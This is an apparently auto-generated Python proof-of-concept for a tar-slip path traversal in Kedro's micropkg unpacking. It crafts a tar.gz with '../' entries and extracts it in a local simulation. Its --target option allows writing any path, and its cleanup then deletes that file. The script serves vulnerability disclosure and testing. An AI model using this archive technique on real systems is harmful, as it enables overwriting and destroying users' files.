#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: afo-000
# Sink: _unpack_sdist
# Auto-generated — run with: python3 afo_cli_manifest_passed_unpack__unpack_sdist_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg path traversal (AFO).

This script demonstrates how an attacker can craft a malicious tar.gz archive
that, when extracted by Kedro's `safe_extract` function, overwrites arbitrary
files outside the intended destination directory. The vulnerability exists
because `safe_extract` does not validate entry paths for `../` sequences.

The PoC creates a benign payload that writes to /tmp/poc_success.txt to prove
arbitrary file write capability. In a real attack, this could be used to
overwrite configuration files, SSH keys, or other sensitive data.

Usage:
    python3 poc_kedro_tar_slip.py [--target /path/to/kedro/project]
"""

import argparse
import io
import os
import shutil
import tarfile
import tempfile
import sys
from pathlib import Path


def create_malicious_tar(output_path: str, payload_path: str, payload_content: str):
    """
    Create a tar.gz archive with a path traversal entry.

    The archive contains a single file entry that uses '../' to escape the
    extraction directory and write to an arbitrary location.

    Args:
        output_path: Path where the malicious tar.gz will be written
        payload_path: The target absolute path where the payload should be written
        payload_content: Content to write to the target file
    """
    # Create a tar entry that traverses up from the extraction directory
    # For example, if extraction happens in /tmp/kedro_extract_xxx/, the entry
    # ../../../../tmp/poc_success.txt will resolve to /tmp/poc_success.txt
    traversal_path = os.path.relpath(payload_path, "/")  # e.g., "tmp/poc_success.txt"
    # Add enough ../ to escape any reasonable temp directory depth
    # Typical temp dir: /tmp/tmpXXXXXX/ -> need 3 levels up to reach /
    # We'll use 10 to be safe
    malicious_entry_name = os.path.join(
        *[".."] * 10,
        traversal_path.lstrip("/")
    )

    with tarfile.open(output_path, "w:gz") as tar:
        # Create a TarInfo object for the malicious entry
        info = tarfile.TarInfo(name=malicious_entry_name)
        info.size = len(payload_content)
        info.type = tarfile.REGTYPE
        info.mtime = 0
        info.uid = 0
        info.gid = 0
        info.uname = "root"
        info.gname = "root"
        info.mode = 0o644

        # Add the payload content
        tar.addfile(info, io.BytesIO(payload_content.encode()))

    print(f"[+] Created malicious archive: {output_path}")
    print(f"    Entry name: {malicious_entry_name}")
    print(f"    Will write to: {payload_path}")


def simulate_kedro_extraction(archive_path: str, extract_dir: str):
    """
    Simulate Kedro's _unpack_sdist / safe_extract behavior.

    This replicates the vulnerable extraction logic found in Kedro's
    micropkg.py without any path traversal protection.

    Args:
        archive_path: Path to the tar.gz archive
        extract_dir: Directory where extraction occurs
    """
    print(f"[*] Simulating Kedro extraction to: {extract_dir}")
    with tarfile.open(archive_path, "r:gz") as tar:
        # This is the vulnerable call - no path validation
        tar.extractall(path=extract_dir)
    print("[*] Extraction complete (vulnerable method)")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg path traversal (tar slip)"
    )
    parser.add_argument(
        "--target",
        default="/tmp/poc_success.txt",
        help="Target file path to write (default: /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    target_path = os.path.abspath(args.target)
    payload_content = "Kedro path traversal PoC - SUCCESS\n"

    print("[*] Kedro Tar Slip PoC")
    print(f"[*] Target file: {target_path}")
    print(f"[*] Payload: '{payload_content.strip()}'")

    # Create a temporary directory for the malicious archive
    with tempfile.TemporaryDirectory() as tmpdir:
        archive_path = os.path.join(tmpdir, "malicious_package.tar.gz")

        # Step 1: Create the malicious tar archive
        create_malicious_tar(archive_path, target_path, payload_content)

        # Step 2: Create a temporary extraction directory (simulates Kedro's temp_dir)
        extract_dir = tempfile.mkdtemp(prefix="kedro_extract_")
        try:
            # Step 3: Simulate the vulnerable extraction
            simulate_kedro_extraction(archive_path, extract_dir)

            # Step 4: Verify the payload was written
            if os.path.exists(target_path):
                with open(target_path, "r") as f:
                    content = f.read()
                if "SUCCESS" in content:
                    print(f"\n[+] EXPLOIT SUCCESSFUL: File written to {target_path}")
                    print(f"    Content: {content.strip()}")
                else:
                    print(f"\n[-] File exists but content unexpected: {content}")
            else:
                print(f"\n[-] Target file not found: {target_path}")
                print("    (This may happen if the traversal path was incorrect)")

        finally:
            # Cleanup: remove the extraction directory and the payload file
            shutil.rmtree(extract_dir, ignore_errors=True)
            if os.path.exists(target_path):
                os.remove(target_path)
                print(f"[*] Cleaned up payload file: {target_path}")

    print("\n[*] PoC completed. The vulnerability is confirmed if you see 'SUCCESS' above.")


if __name__ == "__main__":
    main()
